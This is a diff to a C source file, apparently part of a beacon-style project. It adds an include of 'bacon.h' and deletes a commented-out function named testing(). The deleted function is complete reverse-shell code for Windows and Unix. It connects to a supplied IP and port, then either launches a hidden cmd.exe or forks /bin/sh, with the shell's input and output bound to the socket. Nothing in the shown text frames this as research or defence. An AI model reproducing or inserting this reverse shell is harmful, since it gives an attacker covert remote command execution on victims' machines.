@@ -1,3 +1,5 @@
+#include "bacon.h"
+
 #ifdef _WIN32
     #include <winsock2.h>
     #include <windows.h>
@@ -78,50 +80,3 @@ int testing(void) {
 
     return 0;
 }
-
-/*
-int testing(void) {
-    printf("testing\n");
-
-    #ifdef _WIN32
-        WSAStartup(MAKEWORD(2,2), &wsaData);
-        winSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
-    #else
-        sockfd = socket(AF_INET, SOCK_STREAM, 0);
-    #endif
-
-    sockAddr.sin_family = AF_INET;
-    sockAddr.sin_port = htons(port);
-    sockAddr.sin_addr.s_addr = inet_addr(ip);
-
-    #ifdef _WIN32
-        WSAConnect(winSock, (SOCKADDR*)&sockAddr, sizeof(sockAddr), NULL, NULL, NULL, NULL);
-
-        STARTUPINFO si;
-        PROCESS_INFORMATION pi;
-        ZeroMemory(&si, sizeof(si));
-        si.cb = sizeof(si);
-        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
-        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)winSock;
-        si.wShowWindow = SW_HIDE;
-
-        char cmd[] = "cmd.exe";
-        CreateProcess(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
-
-        // Optionally, close handles to avoid resource leaks
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
-    #else
-        connect(sockfd, (struct sockaddr*)&sockAddr, sizeof(sockAddr));
-        // For Unix-like systems, fork and exec to run a shell in the background
-        if (fork() == 0) {
-            dup2(sockfd, 0);
-            dup2(sockfd, 1);
-            dup2(sockfd, 2);
-            execl("/bin/sh", "sh", NULL);
-        }
-    #endif
-
-    return 0;
-}
-*/
